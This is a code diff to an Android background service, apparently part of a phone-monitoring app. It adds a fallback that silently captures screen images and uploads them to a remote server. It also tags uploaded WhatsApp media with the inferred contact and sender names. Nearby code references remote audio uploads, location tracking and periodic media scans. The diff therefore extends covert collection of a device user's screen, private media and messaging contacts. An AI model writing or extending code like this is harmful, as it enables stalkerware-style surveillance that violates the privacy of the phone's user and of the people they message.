@@ -73,6 +73,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
     private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
+    private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
     private static final long NORMAL_LOOP_MS = 30_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
@@ -454,6 +455,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception e) {
             Log.e(TAG, "captureAndUploadScreenFrame err", e);
             try {
+                captureAndUploadScreenImage(sessionId);
+            } catch (Exception fallbackError) {
+                Log.e(TAG, "captureAndUploadScreenImage fallback err", fallbackError);
+            }
+            try {
                 JSONObject ctx = new JSONObject();
                 ctx.put("sessionId", sessionId);
                 ctx.put("error", e.getClass().getSimpleName());
@@ -474,6 +480,69 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             }
             screenRecorder = null;
             if (screenRecorderFile != null && screenRecorderFile.exists()) screenRecorderFile.delete();
+        }
+    }
+
+    private void captureAndUploadScreenImage(String sessionId) throws Exception {
+        if (mediaProjection == null) return;
+        long startedAt = System.currentTimeMillis();
+        DisplayMetrics dm = getResources().getDisplayMetrics();
+        int width = Math.max(480, Math.min(1080, dm.widthPixels));
+        int height = Math.max(800, Math.min(1920, dm.heightPixels));
+        int density = Math.max(1, dm.densityDpi);
+        ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        VirtualDisplay display = mediaProjection.createVirtualDisplay(
+                "remote-screen-fallback",
+                width,
+                height,
+                density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                reader.getSurface(),
+                null,
+                null
+        );
+        Image image = null;
+        try {
+            Thread.sleep(450L);
+            image = reader.acquireLatestImage();
+            if (image == null) throw new IllegalStateException("screen_image_unavailable");
+            byte[] jpeg = imageToJpeg(image);
+            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_screen_image");
+            Map<String, String> form = new HashMap<>();
+            form.put("captureMode", "remote_live");
+            form.put("captureKind", "screen");
+            form.put("supportSessionId", sessionId);
+            form.put("segmentStartedAtMs", String.valueOf(startedAt));
+            form.put("segmentDurationMs", "1");
+            JSONObject metadata = new JSONObject();
+            metadata.put("source", "MediaProjection");
+            metadata.put("transport", "jpeg_fallback");
+            metadata.put("capturedAtMs", startedAt);
+            form.put("metadataJson", metadata.toString());
+            String filename = "remote_screen_" + sessionId + "_" + startedAt + ".jpg";
+            String res = HttpClient.uploadFile(
+                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
+                    "media",
+                    filename,
+                    jpeg,
+                    "image/jpeg",
+                    form,
+                    currentToken()
+            );
+            JSONObject parsed = new JSONObject(res != null ? res : "{}");
+            if (parsed.optBoolean("ok")) {
+                prefs().edit().putLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
+            }
+        } finally {
+            if (image != null) image.close();
+            try {
+                display.release();
+            } catch (Exception ignored) {
+            }
+            try {
+                reader.close();
+            } catch (Exception ignored) {
+            }
         }
     }
 
@@ -1113,6 +1182,12 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                             || relativePathLower.contains("com.whatsapp.w4b");
                     if (isWhatsappSharedMedia) {
                         metadata.put("sourceApp", "whatsapp_shared_media");
+                        JSONObject whatsappContext = findRecentWhatsappContext(dateAddedSeconds > 0 ? dateAddedSeconds * 1000L : System.currentTimeMillis());
+                        if (whatsappContext != null) {
+                            metadata.put("whatsappContact", whatsappContext.optString("contactName", null));
+                            metadata.put("whatsappSender", whatsappContext.optString("senderName", null));
+                            metadata.put("whatsappDirection", whatsappContext.optString("direction", "received"));
+                        }
                     }
                     form.put("metadataJson", metadata.toString());
                     String resp = HttpClient.uploadFile(url, "media", filename, data, mime, form, token);
@@ -1145,6 +1220,30 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             }
         } finally {
             cursor.close();
+        }
+    }
+
+    private JSONObject findRecentWhatsappContext(long mediaTimestampMs) {
+        try {
+            JSONArray arr = new JSONArray(prefs().getString(KEY_RECENT_WHATSAPP_CONTACTS, "[]"));
+            JSONObject best = null;
+            long bestDelta = Long.MAX_VALUE;
+            for (int i = 0; i < arr.length(); i++) {
+                JSONObject row = arr.optJSONObject(i);
+                if (row == null) continue;
+                long ts = row.optLong("ts", 0L);
+                if (ts <= 0L) continue;
+                long delta = Math.abs(ts - mediaTimestampMs);
+                if (delta > 15 * 60 * 1000L) continue;
+                if (delta < bestDelta) {
+                    best = row;
+                    bestDelta = delta;
+                }
+            }
+            return best;
+        } catch (Exception e) {
+            Log.e(TAG, "findRecentWhatsappContext err", e);
+            return null;
         }
     }
 
